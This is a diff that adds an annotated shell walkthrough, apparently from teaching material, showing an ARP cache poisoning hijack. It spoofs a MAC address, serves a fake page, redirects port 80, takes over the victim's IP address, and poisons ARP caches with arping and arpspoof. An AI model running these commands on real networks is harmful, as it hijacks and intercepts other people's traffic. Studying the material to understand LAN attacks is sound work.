@@ -40,6 +40,111 @@ Essentially, we will be performing an *ARP spoofing* attack. As this behavior is
 
 > :construction: TK-TODO
 
+## :construction: TK-TODO
+
+A demo of performing an ARP cache poisoning attack.
+
+Don't forget to spoof your own hardware address first:
+
+* [SimpleSpoofMAC](https://github.com/meitar/SimpleSpoofMAC)
+
+```sh
+# Some assumptions for this demo:
+VICTIM_IP=192.168.9.10
+
+# Make a temporary directory to store our spoofed site.
+mkdir /tmp/hijack
+cd !$ # Go there.
+
+# Place an `index.html` file in the directory that will be the
+# HTTP server's document root.
+echo "Expecting a local server? Surprise! It's been hijacked by an ARP cache poisoning attack." > index.html
+
+# Start an HTTP server on port 8000 (the default).
+python3 -m http.server &
+
+# Become a `sudo`'er so that we can bind to privileged ports.
+su admin
+
+# Redirect port 80 traffic to our HTTP server on localhost.
+sudo socat TCP4-LISTEN:80,reuseaddr,fork TCP:127.0.0.1:8000
+
+# Find the IP address of the device we are going to impersonate.
+dns-sd -G v4 server.local # Resolve (via mDNS) the server's domain name.
+
+# Alias our own NIC to the IP address that we want to masquerade as.
+# NOTE: This is not necessary for an MITM, since we just need to pass
+# traffic back and forth between our two targets. However, as this is
+# demos a *hijack* rather than an MITM, we need to respond *as* the
+# target instead of passing traffic *to* the target.
+sudo ifconfig en0 ${VICTIM_IP}/24 alias
+
+# Let's take a closer look at the IP address in that command:
+#
+#sudo ifconfig en0 192       . 168       . 9         . 10        /24 add
+#                  1100 0000 . 1010 1000 . 0000 1001 . 0000 1010
+#                       ^
+#                       | The 1s mean "read this bit as part of a network ID."
+#                       v
+#                  255       . 255       . 255       . 0
+#                  1111 1111 . 1111 1111 . 1111 1111 . 0000 0000
+
+# Now that we know the server's IP address, let's note its MAC address.
+# If it responds to ICMP echo requests, `ping` will show us output:
+ping $VICTIM_IP
+
+# If it doesn't, we can do an ARP scan instead. There are many tools, but I
+# like using `nmap`; its `-sn` option will do only a host discovery scan.
+sudo nmap -sn -PR $VICTIM_IP # Note `-PR` is default, so can be omitted.
+
+# An alternative tool that provides more output is `arp-scan`.
+arp-scan $VICTIM_IP
+
+# We can also use the `arping` utility for a more surgical approach:
+sudo arping -c 1 -i en0 $VICTIM_IP
+
+# We should now have an entry in our local ARP table ("ARP cache"):
+arp -n $VICTIM_IP
+# GNU/Linux users will probably want to do this instead:
+#ip neighbour show 192.168.1.1
+
+# To actually perform the attack (i.e., to lie about the MAC-to-IP
+# mapping to the network), we can configure our attack machine to
+# respond to ARP requests for the victim IP address with our own
+# NIC's MAC address. This will not *necessarily* work due to the fact
+# that the legitimate answer may come after our own, overriding it.
+sudo arp -s $VICTIM_IP auto pub only ifscope en0
+
+# NOTE: This is only currently easy on true UNIX, like BSD. Attempts
+# to publish a proxy arp entry on GNU/Linux requires a kernel tunable
+# (`net.ipv4.conf.$INTERFACE.proxy_arp`) and proper routing tables.
+# If you really want to attempt this as a GNU/Linux user, you will
+# ulimately want to invoke a command such as the following after setting
+# up your IP routing tables appropriately. ("Appropriately" means what?)
+# Some guidance at http://linux-ip.net/html/tools-ip-neighbor.html
+#sudo arp -Ds 192.168.1.136 eth0 pub
+
+# To improve the liklihood of successfully poisoning the target's ARP cache,
+# we want to continuously broadcast the wrong information, repeatedly.
+# The "wrong information" means an ARP packet whose payload contains:
+#
+# * The `Sender MAC address` field set to the MAC address of the attacker.
+# * The `Sender IP address` field set to the IP address of the target.
+# * The `Target MAC address` field set to the broadcast MAC address.
+# * The `Target IP address` field set to 0.0.0.0.
+#
+# This should be sent as an ARP reply (opcode `0x02`).
+#
+# What this does is tell devices that the IP address of the target is
+# associated with the MAC address of the attacker; hence, ARP spoofing.
+
+# One way we could construct such an ARP packet manually is like so:
+sudo arping -i en0 -U -P -S $VICTIM_IP 0.0.0.0
+
+# More simply, we can just use the `arpspoof` tool:
+arpspoof $VICTIM_IP
+```
+
 # Discussion
 
 > :construction: TK-TODO
